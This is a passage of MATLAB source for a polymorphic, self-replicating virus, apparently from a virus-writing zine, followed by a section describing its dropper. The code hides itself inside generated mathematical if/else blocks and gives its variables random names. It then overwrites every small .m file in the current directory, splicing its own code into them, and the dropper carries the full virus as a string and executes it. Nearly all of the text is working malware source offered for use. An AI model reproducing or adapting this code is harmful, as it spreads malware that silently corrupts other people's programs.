+        if (eval(SavedVector)>eval(MatName)) Operator1='>'; Operator2='<'; end
+        if (eval(SavedVector)<eval(MatName)) Operator1='<'; Operator2='>'; end
+        if (~isempty(Operator1))
+            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];
+            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];                 
+            if (sum(strcmp(Var2Wrt{ObfusCount},SomeMatVec{1}))==0 && IsItAVector) Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1}; end
+            if (TmpVar002==0)
+                ActualCodeForThisPart{ObfusCount}{1}=['if((' SavedVector ')' Operator1 MatName ')'];
+            elseif (TmpVar002==1)
+                ActualCodeForThisPart{ObfusCount}{1}=['if(' MatName Operator1 '(' SavedVector '))'];
+                ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
+                ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];  
+            elseif (TmpVar002==2)
+                ActualCodeForThisPart{ObfusCount}{1}=['if((' SavedVector ')' Operator2 MatName ')'];
+                ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
+                ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];  
+            elseif (TmpVar002==3)                
+                ActualCodeForThisPart{ObfusCount}{1}=['if(' MatName Operator2 '(' SavedVector '))'];
+            end
+            ActualCodeForThisPart{ObfusCount}{3}=['else'];
+            ActualCodeForThisPart{ObfusCount}{5}=['end'];
+        else
+            ObfusCount=ObfusCount-1;%ActualCodeForThisPart{ObfusCount}{1}='NO!!! MXT'; 
+        end        
+
+        RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];
+        if ObfusCount
+            for Count018=1:size(Var2Wrt{ObfusCount},2)
+                eval(Var2Wrt{ObfusCount}{Count018});
+            end
+        end
+
+    elseif (WhichMathAlgo==1)
+        % One or two dimensional integration
+        % S -> (SOS) | F(S) | x
+        % O -> .* | +
+        % F -> sin | cos | exp | atan | ...
+
+        % eval('function out = f(x); out = sin(x); end')
+        % f = inline('sin(x)')
+        % eval('func=@(x)sin(x);')
+
+                                                                                   % Matlab does not support temporary-indexing; Octave does support it, thus makes Octave a much more power-/beautiful language
+        BoundAll1=cellstr(num2str(rand(5,1))); BoundAll2={'pi','log(2)','sqrt(2)','sqrt(3)',BoundAll1{:}}; BoundAll3=randperm(length(BoundAll2));
+
+        if rand>0.6
+            StartFunction=strrep(StartFunction,SReplacePool1{4},SReplacePool1{3}); % just one variable for 1d
+            %InLineFunc=inline(StartFunction, SReplacePool1{3});
+            BoundAll3={BoundAll2{BoundAll3(1:2)}};
+            BoundSign=strrep(strrep(cellstr(num2str(rand(2,1)>0.7)),'1','-'),'0',''); BoundAll3={[BoundSign{1} strrep(BoundAll3{1},' ','')],[BoundSign{2} strrep(BoundAll3{2},' ','')]}; BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];
+            if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{3}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{3}; BoundAll3(3)=[]; end;
+            FctString1='quad'; FctString2=''; FctString3='';
+           
+        else
+            %InLineFunc=inline(StartFunction, SReplacePool1{3}, SReplacePool1{4});
+            BoundAll3={BoundAll2{BoundAll3(1:4)}};
+            BoundSign=strrep(strrep(cellstr(num2str(rand(4,1)>0.7)),'1','-'),'0','');
+            BoundAll3={[BoundSign{1} strrep(BoundAll3{1},' ','')],[BoundSign{2} strrep(BoundAll3{2},' ','')],[BoundSign{3} strrep(BoundAll3{3},' ','')],[BoundSign{4} strrep(BoundAll3{4},' ','')]};           
+            BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];
+            BoundTmpB=[eval(BoundAll3{3}) eval(BoundAll3{4})];
+            if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{5}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{5}; BoundAll3(5)=[]; end;
+            if(sum(abs(sort(BoundTmpB)-BoundTmpB))>0) BoundAll3{5}=BoundAll3{3}; BoundAll3{3}=BoundAll3{4}; BoundAll3{4}=BoundAll3{5}; BoundAll3(5)=[]; end;
+            FctString1='dblquad'; FctString2=[',' BoundAll3{3} ',' BoundAll3{4}]; FctString3=[',' SReplacePool1{4}];
+        end
+
+        IntTolerance=fix(real(log10(eval([FctString1 '(@(' SReplacePool1{3} FctString3 ')' StartFunction ',' BoundAll3{1} ',' BoundAll3{2} FctString2 ',1e' num2str(6666) ')']))))+5;
+        TimeMeasure=0;
+        while (TimeMeasure<0.1 && IntTolerance>-23)
+            IntTolerance=IntTolerance-1;
+            CompleteCompString=[FctString1 '(@(' SReplacePool1{3} FctString3 ')' StartFunction ',' BoundAll3{1} ',' BoundAll3{2} FctString2 ',1e' num2str(IntTolerance) ')'];
+            TimeMeasure=cputime;
+            CompleteErg=eval(CompleteCompString);
+            TimeMeasure=cputime-TimeMeasure;
+            if(isnan(CompleteErg) || isinf(CompleteErg))IntTolerance=-50;end
+        end        
+
+        if (IntTolerance>-23)     
+            runcode=1;
+        else
+            ObfusCount=ObfusCount-1;%ActualCodeForThisPart{ObfusCount}{1}='NO!!! INT';
+        end
+
+    elseif (WhichMathAlgo==2)
+        % Fun with interpolation
+        TmpVar003=fix(rand*50+4); TmpVar004=rand*1000; InterpDataVec=''; for Count019=0:TmpVar003 InterpDataVec=[InterpDataVec num2str(rand*TmpVar004) ' ']; end; InterpDataVec(end)='';
+        Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} '=[' InterpDataVec '];']; eval(Var2Wrt{ObfusCount}{end}); InterpSpline=''; if (rand>0.6) InterpSpline=[',' QuoteSign 'spline' QuoteSign]; end
+        CompleteCompString=['interp1(' RandNameCol{end} ',' num2str(rand*(TmpVar003-1)+1) InterpSpline ')']; RandNameCol(end)=[];
+        CompleteErg=eval(CompleteCompString); runcode=1;
+
+    elseif (WhichMathAlgo==3)
+        % Ordinary differential equation :)
+        Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} '=inline(' QuoteSign StartFunction QuoteSign ',' QuoteSign SReplacePool1{3} QuoteSign ',' QuoteSign SReplacePool1{4} QuoteSign ');']; eval(Var2Wrt{ObfusCount}{end});
+        ODEIntervallA=fix(rand*7-3);ODEIntervallB=fix(ODEIntervallA+rand*4+1);
+        Var2Wrt{ObfusCount}{end+1}=['[' RandNameCol{end-1} ',' RandNameCol{end-2} ']=ode45(' RandNameCol{end} ',[' num2str(ODEIntervallA) ' ' num2str(ODEIntervallB) '],' num2str(rand*4) ');'];
+        eval([Var2Wrt{ObfusCount}{end}(1:end-2) ',odeset(' QuoteSign 'OutputFcn' QuoteSign ',@odefunction));'])
+        ODEDomain=eval(RandNameCol{end-1});
+        ODEIntX=num2str(rand*ODEIntervallB+ODEIntervallA);
+        if rand>0.5
+            CompleteCompString=['interp1(' RandNameCol{end-1} ',' RandNameCol{end-2} ',' ODEIntX ')'];
+        else
+            CompleteCompString=['interp1(' Var2Wrt{ObfusCount}{end}(strfind(Var2Wrt{ObfusCount}{end},'=')+1:end-1) ',' ODEIntX ')'];
+            Var2Wrt{ObfusCount}(end)=[];
+        end
+
+        RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];
+        if (length(ODEDomain)>5&&ODEDomain(end)==ODEIntervallB) CompleteErg=eval(CompleteCompString); else CompleteErg=NaN; end        
+        if (isnan(CompleteErg) || isinf(CompleteErg) || ODEDomain(end)~=ODEIntervallB)
+            while ~isempty(Var2Wrt{ObfusCount}) Var2Wrt{ObfusCount}(end)=[]; end
+            ObfusCount=ObfusCount-1; 
+        else
+            runcode=1;
+        end
+
+    elseif (WhichMathAlgo==4)
+        % Special functions :D
+        CompleteCompString='F(F(S))'; SReplacePool2={'F(S)' 'F(S)' 'F(S)' 'F(S)' 'F(S)' 'D(S,S)' 'R' 'R'}; 
+        while ~isempty(strfind(CompleteCompString,'S'))
+            CompleteCompString=regexprep(CompleteCompString, 'S',SReplacePool2{fix(rand*length(SReplacePool2)+1)},rand*length(strfind(CompleteCompString,'S'))+1);
+            if (length(strfind(CompleteCompString,'F'))+length(strfind(CompleteCompString,'D'))>10) SReplacePool2={'R'}; end;
+        end
+        CompleteCompString=regexprep(CompleteCompString, 'S',SReplacePool2{fix(rand*length(SReplacePool2)+1)});
+        while length(strfind(CompleteCompString,'D'))+length(strfind(CompleteCompString,'F'))+length(strfind(CompleteCompString,'R'))>0
+            CompleteCompString=regexprep(CompleteCompString, 'F',FfAll{fix(rand*length(FfAll)+1)},rand*length(strfind(CompleteCompString,'F'))+1);
+            CompleteCompString=regexprep(CompleteCompString, 'D',DfAll{fix(rand*length(DfAll)+1)},rand*length(strfind(CompleteCompString,'D'))+1);
+            CompleteCompString=regexprep(CompleteCompString, 'R',num2str(rand*10-5),rand*length(strfind(CompleteCompString,'R'))+1);
+        end
+        if (max(cumsum(CompleteCompString=='(')-cumsum(CompleteCompString==')'))<25) CompleteErg=eval(CompleteCompString); else CompleteErg=NaN; end
+        if (isnan(CompleteErg) || isinf(CompleteErg))
+            ObfusCount=ObfusCount-1;
+        else
+            runcode=1;
+        end       
+    end
+
+    if (runcode)
+        RCWriteVar=0;RCNumSub='0';RCNumAdd='0';
+        while (~(CompleteErg>eval(RCNumSub))||~(eval(RCNumSub)<CompleteErg)||~(CompleteErg<eval(RCNumAdd))||~(eval(RCNumAdd)>CompleteErg))
+            if WhichMathAlgo==3 MulFacRC=8; IncFacRC=2; else MulFacRC=0.01; IncFacRC=1; end
+            RCNumSub=num2str(CompleteErg-(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));
+            RCNumAdd=num2str(CompleteErg+(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));
+        end
+        
+        if (rand>0.4)
+            RCsSub=[RandNameCol{end} '=' RCNumSub ';']; RCNumSub=RandNameCol{end};
+            RCsAdd=[RandNameCol{end} '=' RCNumAdd ';']; RCNumAdd=RandNameCol{end}; RCWriteVar=1; RandNameCol(end)=[];
+        end
+        ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];
+        ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];
+        if(RCWriteVar) Var2Wrt{ObfusCount}{end+1}=RCsSub; eval(RCsSub); end
+        runcode=1;
+        TmpVar005=fix(rand*4);
+        
+        if (TmpVar005==0)
+            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '>' RCNumSub ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumSub '<' CompleteCompString ')']; end
+        elseif (TmpVar005==1)
+            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '<' RCNumSub ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumSub '>' CompleteCompString ')']; end
+            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
+            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];
+        elseif (TmpVar005==2)
+            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '>' RCNumAdd ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumAdd '<' CompleteCompString ')']; end
+            if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd); end
+            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
+            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];
+        elseif (TmpVar005==3)
+            if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '<' RCNumAdd ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumAdd '>' CompleteCompString ')']; end
+            if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd); end 
+        end
+        ActualCodeForThisPart{ObfusCount}{3}='else';
+        ActualCodeForThisPart{ObfusCount}{5}='end';
+    end
+    TmpVar006=4;TmpStrWS={'' '' ' ' '' ''};
+    while TmpVar006>0        
+        if ObfusCount
+            if (LineBreaksIf(TmpVar006)==1 && length(ActualCodeForThisPart{ObfusCount})==5)
+                ActualCodeForThisPart{ObfusCount}{TmpVar006}=[ActualCodeForThisPart{ObfusCount}{TmpVar006} TmpStrWS{TmpVar006} ActualCodeForThisPart{ObfusCount}{TmpVar006+1}];
+                ActualCodeForThisPart{ObfusCount}(TmpVar006+1)=[];
+            end
+        end
+        TmpVar006=TmpVar006-1;
+    end
+    
+    if(RandomAppearenceOfIfs)
+        LineBreaksIf=fix(rand(1,4)*2); LineShift={};
+        LineShift{1}(1:fix(rand*8))=' '; if rand>0.7 LineShift{1}='    ';end
+        if rand>0.4
+            LineShift{2}=LineShift{1};
+        else
+            LineShift{2}(1:fix(rand*8))=' ';
+        end;
+    end
+    ObfusCount=ObfusCount+1;
+
+    disp(ObfusCount/length(NewCode));
+end
+Var2Wrt{1}{end+1}='warning off all';
+ActualCodeForThisPart{end+1}={['TheImportantValue=' TmpRndName{1} '; eval(TheImportantValue);']}; Var2Wrt{end+1}={};
+ActualCodeForThisPart{end+1}={['TheValueToCompare=' QuoteSign 'disp(' QuoteSign QuoteSign 'Bedecke deinen Himmel, Zeus, Mit Wolkendunst, Und übe, dem Knaben gleich, Der Disteln köpft, An Eichen dich und Bergeshöhn; Müßt mir meine Erde Doch lassen stehn, Und meine Hütte, die du nicht gebaut, Und meinen Herd Um dessen Gluth Du mich beneidest.' QuoteSign QuoteSign ');' QuoteSign ';']};Var2Wrt{end+1}={};
+ActualCodeForThisPart{end+1}={['if(strcmp(TheImportantValue,TheValueToCompare)) load gong.mat;sound(y, Fs);else disp(' QuoteSign 'SOME PROBLEM' QuoteSign '); load handel.mat; for i=1:1 sound(y, Fs); end; input(' QuoteSign 'STOP' QuoteSign '); end']};Var2Wrt{end+1}={};
+
+if ~isempty(Var2Wrt)
+    for j=1:length(Var2Wrt)
+        for i=1:length(Var2Wrt{j})
+            disp(Var2Wrt{j}{i});
+        end
+    end
+end
+
+if ~isempty(ActualCodeForThisPart)
+    for j=1:length(ActualCodeForThisPart)
+        for i=1:length(ActualCodeForThisPart{j})
+            disp(ActualCodeForThisPart{j}{i});
+        end
+    end
+end
+
+eval(ViralBodyVariable);
+
+disp('Lets start the insertation!');
+
+
+VirCode={}; Count020=length(ActualCodeForThisPart);
+while Count020>0
+    VirCode{end+1}=ActualCodeForThisPart{Count020};
+    for Count021=Count020:length(ActualCodeForThisPart)     
+        if ~isempty(Var2Wrt{Count021}) if rand>0.3 VirCode{end+1}=Var2Wrt{Count021}(end); Var2Wrt{Count021}(end)=[]; end; end
+    end
+    Count020=Count020-1;
+end
+
+IsAllEmpty=false;
+while ~IsAllEmpty
+    IsAllEmpty=true;
+    for Count022=1:length(Var2Wrt)
+        if ~isempty(Var2Wrt{Count022})
+            IsAllEmpty=false;
+            if rand>0.5
+                VirCode{end+1}=Var2Wrt{Count022}(end); Var2Wrt{Count022}(end)=[];
+            end
+        end
+    end
+end
+
+%VirCode{:}
+
+VicFiles=dir('*.m');
+VicLines={};
+for Count023=1:length(VicFiles)
+    if (VicFiles(Count023).bytes<1000 && ~strcmp(VicFiles(Count023).name,'odefunction.m'))
+        disp(VicFiles(Count023).name);
+        VicIDr=fopen(VicFiles(Count023).name, 'r'); VicLines={fgetl(VicIDr)};
+        while ischar(VicLines{end});
+           VicLines{end+1}=fgetl(VicIDr);
+        end
+        VicLines(end)=[];
+        %VicLines(:)
+
+        % Remove Commands and ...
+
+        Count024=1;
+        while Count024<length(VicLines)+1
+            IsAPO=0;
+            Count025=1;
+            while Count025<length(VicLines{Count024})+1
+                if VicLines{Count024}(Count025)==QuoteSign IsAPO=~IsAPO; end
+                if ~IsAPO
+                    if VicLines{Count024}(Count025)==char(37)
+                        if Count025==1 VicLines(Count024)=[]; else VicLines{Count024}=VicLines{Count024}(1:Count025-1); end
+                    end
+                    if Count025+1<length(VicLines{Count024})
+                        if all(VicLines{Count024}(Count025:Count025+2)=='...')
+                            VicLines{Count024}=strcat(VicLines{Count024}(1:Count025-1),VicLines{Count024+1}); Count025=1;
+                            if length(VicLines)>Count024 VicLines(Count024+1)=[]; end
+                        end
+                    end
+                end
+                Count025=Count025+1;
+            end
+            Count024=Count024+1;
+        end
+
+        EndArray={'if' 'for' 'while' 'try' 'switch' 'parfor'}; EndCount=0;
+        GoodLine=[];
+        for Count026=1:length(VicLines)
+            IsAPP=0;
+            if ~EndCount GoodLine=[GoodLine Count026]; end
+            for Count027=1:length(VicLines{Count026})
+                if (VicLines{Count026}(Count027)==QuoteSign) IsAPP=~IsAPP; end
+                if ~IsAPP
+                    for Count028=1:length(EndArray)
+                        if Count027+length(EndArray{Count028})<length(VicLines{Count026})
+                            if all(VicLines{Count026}(Count027:Count027+length(EndArray{Count028})-1)==EndArray{Count028})
+                                IsStart=0;
+                                if (Count027==1)
+                                    IsStart=1;
+                                elseif (VicLines{Count026}(Count027-1)==' ' || VicLines{Count026}(Count027-1)==';' || VicLines{Count026}(Count027-1)==char(9))
+                                    IsStart=1;
+                                end
+                                if Count027+length(EndArray{Count028})-1==length(VicLines{Count026})
+                                    IsStart=IsStart+1;
+                                elseif (VicLines{Count026}(Count027+length(EndArray{Count028}))==' ' || VicLines{Count026}(Count027+length(EndArray{Count028}))=='(' || VicLines{Count026}(Count027+length(EndArray{Count028}))==char(9))
+                                    IsStart=IsStart+1;
+                                end
+                                if IsStart==2
+                                    EndCount=EndCount+1;
+                                end
+                            end
+                        end
+                    end
+                    if Count027+1<length(VicLines{Count026})
+                        if all(VicLines{Count026}(Count027:Count027+2)=='end')                        
+                            IsEnd=0;
+                            if (Count027==1)
+                                IsEnd=1;
+                            elseif (VicLines{Count026}(Count027-1)==' ' || VicLines{Count026}(Count027-1)==';' || VicLines{Count026}(Count027-1)==char(9))
+                                IsEnd=1;
+                            end
+                            if Count027+2==length(VicLines{Count026})
+                                IsEnd=IsEnd+1;
+                            elseif (VicLines{Count026}(Count027+3)==' ' || VicLines{Count026}(Count027+3)==';' || VicLines{Count026}(Count027+3)==char(9))
+                                IsEnd=IsEnd+1;
+                            end
+                            if IsEnd==2
+                                EndCount=EndCount-1;
+                            end
+                        end
+                    end
+                end
+            end
+        end
+
+        NewInfCode={}; VCsplitted={};
+        VirSplit=sort([0 length(VirCode) fix(rand(1,length(GoodLine)-1)*length(VirCode))]);
+        TmpVar007=length(VirSplit);
+        while TmpVar007>1
+            if (VirSplit(TmpVar007-1)<VirSplit(TmpVar007)) VCsplitted{length(VirSplit)-TmpVar007+1}=VirCode(VirSplit(TmpVar007-1)+1:VirSplit(TmpVar007)); else VCsplitted{length(VirSplit)-TmpVar007+1}={}; end
+            TmpVar007=TmpVar007-1;
+        end
+        GoodLine(end+1)=length(VicLines);        
+        for Count029=1:length(GoodLine)-1
+            NewInfCode={NewInfCode{:} VicLines{GoodLine(Count029):GoodLine(Count029+1)-1}};   
+            TmpVar008=length(VCsplitted{Count029});
+            while TmpVar008>0
+                NewInfCode={NewInfCode{:} VCsplitted{Count029}{TmpVar008}{:}};
+                TmpVar008=TmpVar008-1;
+            end         
+        end
+        NewInfCode={NewInfCode{:} VicLines{end}};
+        fclose(VicIDr);
+        VicIDw=fopen(VicFiles(Count023).name, 'w+');
+        for Count030=1:length(NewInfCode)
+            fprintf(VicIDw,[NewInfCode{Count030} char(13) char(10)]);
+        end
+        fclose(VicIDw);
+    end
+end
+
+
+VicLines(:)
+NewInfCode(:)
+load gong.mat;
+sound(y, Fs);
+- - - - - - - - - - - - - 
+
+
+
+
+
+  5) Running-Virus Dropper
+
+     The first generation is started via a dropper, that contains the whole
+     viruscode as a string. It first shows the code of the virus in the
+     Matlab window, then executes it.
+
+- - - - - - - - - - - - - 
+disp('Microphone Fever - the best thing you can do within 153 seconds...');
+MyCode=['warning off all;'];
+MyCode=[MyCode 'MyCode=[MyCode,'' ''];VarList2Change={''MyCode'' ''TmpRndName'' ''ThisVarContainsVirus''  ''VarList2Change'' ''FfAll'' ''DfAll'' ''SplitOffset'' ''CodePart'' ''TmpOrd'' ''Rnames'' ''NewCode'' ''TrashNames'' ''TrashLine'' ''SplitSize'' ''QuoteSign'' ''CreateTrashA'' ''CreateTrashB'' ''CreateTrashC'' ''CreateTrashD'' ''CreateTrash1'' ''CreateTrash2'' ''ODEfile'' ''odefunction'' ''RandPermSS'' ''AlgoMatrix'' ''ViralBodyVariable'' ''ActualCodeForThisPart'' ''Var2Wrt'' ''ObfusCount'' ''RandomAppearenceOfIfs'' ''LineBreaksIf'' ''LineShift'' ''runcode'' ''RandNameCol'' ''CODE'' ''TRASH'' ''WhichMathAlgo'' ''FReplacePool1'' ''StartFunction'' ''SReplacePool1'' ''OReplacePool1'' ''MatSizeN'' ''SomeMatVec'' ''MultFct'' ''SpecMatName'' ''SpecVecName'' ''WhichMatrixAlgo'' ''MatArOp'' ''VecArOp'' ''SavedVector'' ''IsItAVector'' ''Operator1'' ''Operator2'' ''BoundAll1'' ''BoundAll2'' ''BoundAll3'' ''BoundTmpA'' ''BoundTmpB'' ''BoundSign'' ''FctString1'' ''FctString2'' ''FctString3'' ''IntTolerance'' ''TimeMeasure'' ''CompleteCompString'' ''CompleteErg'' ''InterpDataVec'' ''InterpSpline'' ''ODEIntervallA'' ''ODEIntervallB'' ''ODEDomain'' ''ODEIntX'' ''SReplacePool2'' ''RCWriteVar'' ''RCNumSub'' ''RCNumAdd'' ''MulFacRC'' ''IncFa'' ''RC'' ''RCsSub'' ''RCsAdd'' ''VirCode'' ''IsAllEmpty'' ''VicFiles'' ''VicLines'' ''NewInfCode'' ''VicIDr'' ''IsAPO'' ''EndArray'' ''EndCount'' ''GoodLine'' ''IsAPP'' ''IsStart'' ''IsEnd'' ''VCsplitted'' ''VirSplit'' ''VicIDw'' ''Count000'' ''Count001'' ''Count002'' ''Count003'' ''Count004'' ''Count005'' ''Count006'' ''Count007'' ''Count008'' ''Count009'' ''Count010'' ''Count011'' ''Count012'' ''Count013'' ''Count014'' ''Count015'' ''Count016'' ''Count017'' ''Count018'' ''Count019'' ''Count020'' ''Count021'' ''Count022'' ''Count023'' ''Count024'' ''Count025'' ''Count026'' ''Count027'' ''Count028'' ''Count029'' ''Count030'' ''Count031'' ''Count032'' ''Count033'' ''TmpVar001'' ''TmpVar002'' ''TmpVar003'' ''TmpVar004'' ''TmpVar005'' ''TmpVar006'' ''TmpVar007'' ''TmpVar008''};FfAll={''sin'' ''sinh'' ''asin'' ''asinh'' ''cos'' ''cosh'' ''acos'' ''acosh'' ''tan'' ''tanh'' ''atan'' ''atanh'' ''sec'' ''sech'' ''asec'' ''asech'' ''csc'' ''csch'' ''acsc'' ''acsch'' ''cot''  ''coth'' ''acot'' ''acoth'' ''exp'' ''expm1'' ''log'' ''log1p'' ''log10'' ''log2'' ''pow2'' ''sqrt'' ''nextpow2'' ''abs'' ''angle'' ''conj'' ''imag'' ''real'' ''unwrap'' ''fix'' ''floor'' ''ceil'' ''round'' ''sign'' ''airy'' ''expint''};DfAll={''hypot'' ''dot'' ''cart2pol'' ''pol2cart'' ''atan2''};TmpRndName={};for Count032=1:length(VarList2Change) TmpRndName{end+1}=''if'';while(any(strcmp({FfAll{:} DfAll{:} TmpRndName{1:end-1}},TmpRndName{end}))||iskeyword(TmpRndName{end}))TmpRndName{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end;end;for Count031=1:length(VarList2Change) MyCode=strrep(MyCode,VarList2Change{Count031},TmpRndName{Count031});end;'];
+MyCode=[MyCode 'rand(''twister'',fix(sum(cputime)));SplitOffset=unique([1,sort(fix(rand(1,fix(rand*length(MyCode)/5)+3)*size(MyCode,2)+1)),size(MyCode,2)]);CodePart={};Rnames={};NewCode={};TrashNames={};TrashLine={};SplitSize=size(SplitOffset,2)-1;'];
+MyCode=[MyCode 'QuoteSign=char(39);for Count033=1:SplitSize CodePart{end+1}=strrep(MyCode(SplitOffset(Count033):SplitOffset(Count033+1)-1),QuoteSign,[QuoteSign QuoteSign]);Rnames{end+1}=''sin'';while any(strcmp({FfAll{:} DfAll{:} Rnames{1:end-1}},Rnames{end})) Rnames{end}=char(fix(rand(1,fix(rand*15)+4)*25)+97);end;end;'];
+MyCode=[MyCode 'CreateTrashA=''if(max(sum(AlgoMatrix))>0.05*SplitSize)TrashNames=Rnames(diag(AlgoMatrix));end;tmp=rand;tn=fix(rand*(length(TrashNames)-1)+1);TmpOrd=randperm(length(TrashNames));'';CreateTrashB=[''if (tmp>0.9) TrashLine{end+1}=[Rnames{fix(rand*SplitSize+1)} '',QuoteSign,''='',QuoteSign,'',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,'',QuoteSign,'';'',QuoteSign,''];else''];CreateTrashC=[''if (tmp>0.7 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},'',QuoteSign,''=['',QuoteSign,'',TrashNames{tn},'',QuoteSign,'' '',QuoteSign,'',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashC=[CreateTrashC ''elseif (tmp>0.5 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{TmpOrd(1)},'',QuoteSign,''=['',QuoteSign,'',TrashNames{TmpOrd(2)},'',QuoteSign,'' '',QuoteSign,'',TrashNames{TmpOrd(1)},'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashC=[CreateTrashC ''elseif (tmp>0.3 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{TmpOrd(1)},'',QuoteSign,''=['',QuoteSign,'',TrashNames{TmpOrd(1)},'',QuoteSign,'' '',QuoteSign,'',TrashNames{TmpOrd(2)},'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashC=[CreateTrashC ''elseif (tmp>0.1 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},'',QuoteSign,''=['',QuoteSign,'',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,'',QuoteSign,'' '',QuoteSign,'',TrashNames{tn},'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashD=[''else TrashLine{end+1}=[Rnames{tn},'',QuoteSign,''='',QuoteSign,'',QuoteSign,char(fix(rand(1,fix(rand*2)+2)*25)+97),QuoteSign,'',QuoteSign,'';'',QuoteSign,''];end''];CreateTrash1=[CreateTrashA CreateTrashB CreateTrashC CreateTrashD];CreateTrash2=[CreateTrashA CreateTrashC ''else TrashLine{end+1}=[TrashNames{tn},'',QuoteSign,''=['',QuoteSign,'',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,'',QuoteSign,'' '',QuoteSign,'',TrashNames{tn},'',QuoteSign,''];'',QuoteSign,''];end''];'];
+MyCode=[MyCode 'ODEfile=fopen(''odefunction.m'',''w+'');fprintf(ODEfile,[''function status=odefunction(t,y,flagzz,args);status=0;if ~isempty(t) if ~any(abs(t-t(1))>1.e-4) status=1;end;end'']);fclose(ODEfile);rehash;RandPermSS=randperm(SplitSize);AlgoMatrix=false(SplitSize,SplitSize);for Count000=1:SplitSize disp([num2str(Count000) ''/'' num2str(SplitSize)]);if(RandPermSS(Count000)>1)for Count001=1:SplitSize if(rand>0.4&&AlgoMatrix(RandPermSS(Count000)-1,Count001))NewCode{end+1}=[Rnames{Count001},''=['',Rnames{Count001},'' '',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,''];''];AlgoMatrix(RandPermSS(Count000),Count001)=1;eval(CreateTrash1);end;end;end;if(sum(AlgoMatrix(RandPermSS(Count000),:),2)==0 && RandPermSS(Count000)<SplitSize-1)for Count002=1:SplitSize if(rand>0.4&&AlgoMatrix(RandPermSS(Count000)+1,Count002)==1)NewCode{end+1}=[Rnames{Count002},''=['',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,'' '',Rnames{Count002},''];''];AlgoMatrix(RandPermSS(Count000),Count002)=1;eval(CreateTrash1);end;end;end;if(sum(AlgoMatrix(RandPermSS(Count000),:),2)==0)NewCode{end+1}=[Rnames{RandPermSS(Count000)},''='',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,'';''];AlgoMatrix(RandPermSS(Count000),RandPermSS(Count000))=1;TrashNames{end+1}=Rnames{RandPermSS(Count000)};eval(CreateTrash1);end;for Count003=2:SplitSize for Count004=1:SplitSize Count005=find(AlgoMatrix(Count003,:));if(~AlgoMatrix(Count003,Count004)&&AlgoMatrix(Count003-1,Count004)&&size(Count005,2)>0&&rand>0.4)if(rand>0.5)NewCode{end+1}=[Rnames{Count004},''=['',Rnames{Count004},'' '',Rnames{Count005},''];''];AlgoMatrix(:,Count004)=AlgoMatrix(:,Count004)+AlgoMatrix(:,Count005);AlgoMatrix(:,Count005)=0;eval(CreateTrash1);else NewCode{end+1}=[Rnames{Count005},''=['',Rnames{Count004},'' '',Rnames{Count005},''];''];AlgoMatrix(:,Count005)=AlgoMatrix(:,Count005)+AlgoMatrix(:,Count004);AlgoMatrix(:,Count004)=0;eval(CreateTrash1);end;end;end;end;end;while ~any(all(AlgoMatrix)) for Count006=2:SplitSize for Count007=1:SplitSize Count008=find(AlgoMatrix(Count006,:));if(~AlgoMatrix(Count006,Count007)&&AlgoMatrix(Count006-1,Count007)&&size(Count008,2)>0&&rand>0.4)if(rand>0.5)NewCode{end+1}=[Rnames{Count007},''=['',Rnames{Count007},'' 